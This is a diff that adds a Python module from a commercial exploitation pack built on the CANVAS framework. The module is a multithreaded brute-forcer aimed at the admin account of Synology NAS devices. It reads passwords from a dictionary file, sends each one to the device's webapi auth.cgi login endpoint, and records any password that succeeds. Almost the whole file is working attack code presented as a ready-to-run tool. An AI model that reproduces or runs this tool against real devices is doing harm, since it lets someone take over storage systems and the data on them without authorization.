@@ -1,0 +1,150 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2016
+#
+
+###
+# STD Modules
+###
+import os, sys, time
+try:
+  import requests
+except ImportError:
+  print '[D2] Install module requests'
+
+if "." not in sys.path:
+    sys.path.append(".")
+
+###
+# CANVAS Modules
+###
+from exploitutils import *
+from tcpexploit import tcpexploit
+import threading
+
+###
+# Description
+###
+NAME        = 'd2sec_synology_brute'
+DESCRIPTION = 'Threaded authentication Synology NAS brute forcer'
+VERSION     = '0.2'
+
+DOCUMENTATION                  = {}
+DOCUMENTATION['References']    = ''
+DOCUMENTATION['Repeatability'] = 'Infinite'
+DOCUMENTATION['Notes']         = ''
+
+PROPERTY         = {}
+PROPERTY['TYPE'] = 'Tools'
+PROPERTY['SITE'] = 'Remote'
+PROPERTY['ARCH'] = [ ["Linux"], ["Windows"], ["Solaris"], ["AIX"], ["FreeBSD"], ["MacOSX"], ["HP-UX"] ]
+
+class theexploit(tcpexploit):
+  def __init__(self):
+    tcpexploit.__init__(self)        
+    self.name = NAME
+    self.host = ''
+    self.port = 5000
+    self.dict = ''
+    self.website = self.host
+    self.mylock = threading.RLock()
+    self.threadcount = 5
+    self.authtrue = False
+    self.passadmin = ''
+
+  def getArgs(self):
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get('port',self.port))
+    self.website = self.argsDict.get("website",self.website)
+    self.dict = self.argsDict.get("dict",self.dict)
+    self.threadcount = int(self.argsDict.get("threadcount", self.threadcount))
+
+  def getNextPass(self):
+    while 1:
+      try:
+        passwd = self.fd.readline()
+        if passwd == "":
+          self.no_more_passwd = True 
+          break 
+        passwd = passwd.strip()
+      except IOError:
+        break
+      yield passwd
+    
+  def start_workers(self, function):
+    #self.log("[D2] Spawning %d threads ..." % self.threadcount)
+    for i in range(0, self.threadcount):
+      thread = threading.Thread(target=function)
+      thread.start()
+
+  def wait4workers(self):
+    while (self.no_more_passwd != True):
+      time.sleep(2)
+
+  def run_in_thread(self):
+    passwd = "A"
+    no_more_passwd = False
+    while passwd != None:
+      if self.state == self.HALT:
+        self.log("[D2] Thread halting.")
+        return
+      self.mylock.acquire()
+      try:
+        passwd = self.passwd.next()
+      except StopIteration:
+        no_more_passwd = True
+      self.mylock.release()
+      if no_more_passwd:
+        return
+      try:
+        r = requests.get('http://%s:%s/webapi/query.cgi?api=SYNO.API.Info&version=1&method=query&query=SYNO.API.Auth'%(self.host, self.port), timeout=5)
+      except Exception, e:
+        self.log("[D2] %s" % e)
+      else:  
+        if r.status_code != 404:
+          maxVersion = r.json()['data']['SYNO.API.Auth']['maxVersion']
+          try:
+            r = requests.get('http://%s:%s/webapi/auth.cgi?api=SYNO.API.Auth&version=%d&method=login&account=admin&passwd=%s&session=FileStation&format=cookie'%(self.host, self.port, int(maxVersion), passwd), timeout=5)
+          except Exception, e:
+            self.log("[D2] %s" % e)
+          else:
+            if r.status_code != 404:
+              if r.json()['success'] == True:
+                self.authtrue = True        
+                self.passadmin = passwd
+          requests.get('http://%s:%s/webapi/auth.cgi?api=SYNO.API.Auth&version=1&method=logout&session=FileStation'%(self.host, self.port), timeout=5)
+          
+
+  def run(self):
+    if self.getArgs():
+      self.setInfo('[D2] %s attacking %s:%d - done (failed)' % (NAME,self.host,self.port))
+      return 0
+    self.log('[D2] %s running against %s:%d'%(NAME,self.host,self.port))
+    self.setInfo('[D2] %s attacking %s:%d - running'%(NAME,self.host,self.port))
+    self.no_more_passwd = False
+    self.passwd = self.getNextPass()
+    self.fd = file(self.dict, "rb")
+    self.start_workers(self.run_in_thread)
+    self.wait4workers()
+    time.sleep(5)
+    if self.no_more_passwd == True:
+      if self.authtrue == True:
+        self.log("[D2] Found passwd : %s"%self.passadmin)
+        self.log('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
+        self.setInfo('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
+        return 1
+      self.log('[D2] %s attacking %s:%d - done (failed)' % (NAME,self.host,self.port))
+      self.setInfo('[D2] %s attacking %s:%d - done (failed)' % (NAME,self.host,self.port))
+      return 0
+
+  def usage(self):
+    print 'Usage: %s -t host -p port -O website:url -O dict:name -O threadcount:5' % (sys.argv[0])
+    sys.exit(0)
+
+if __name__=='__main__':
+  app = theexploit()
+  ret = standard_callback_commandline(app)
